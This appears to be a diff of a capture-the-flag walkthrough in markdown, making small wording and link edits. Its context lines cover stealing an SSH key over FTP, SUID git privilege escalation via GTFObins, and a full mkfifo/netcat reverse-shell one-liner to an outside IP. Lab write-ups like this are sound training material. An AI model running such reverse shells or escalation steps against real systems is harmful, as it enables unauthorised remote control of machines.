@@ -27,7 +27,7 @@
 ![image](images/ftp.png)
 
 
-We get id-rsa of a user, if we the public key too, and cat that out we can see the id_rsa was of user `ashu`<br />
+We get id-rsa of a user, if we get the public key too, and cat that out we can see the id_rsa was of user `ashu`<br />
 
 -----------------------
 ##### Login via user `Ashu`:<br />
@@ -70,8 +70,9 @@ Let's check for `suid` bits after getting user `skidy`:<br />
 ![image](images/suid.png)
 
 ```
-We see /usr/bin/git there, let's check its [GTFO-BINS](https://gtfobins.github.io/gtfobins/git/)
+We see /usr/bin/git there, let's check its gtfo-bins page
 ```
+[GTFO-BINS](https://gtfobins.github.io/gtfobins/git/)
 
 ![image](images/gtfo.png)
 
@@ -92,7 +93,7 @@ nc 10.10.224.175 9001
 
 > It is a backdoor for user ashu...
 
-put the pass we found in the python script of user skidy `y......!`<br />
+put the pass we found in the python script in the home directory of user skidy `y......!`<br />
 
 ![image](images/9001.png)
 
@@ -100,7 +101,7 @@ put the pass we found in the python script of user skidy `y......!`<br />
 
 `echo "#!/bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.91.66 8888 >/tmp/f" > /tmp/a; chmod +x /tmp/a`<br />
 
-![image](echo.png)
+![image](images/echo.png)
 
 Now, let's use port `9002` to get a rev-shell on the port we put above-<br />
 
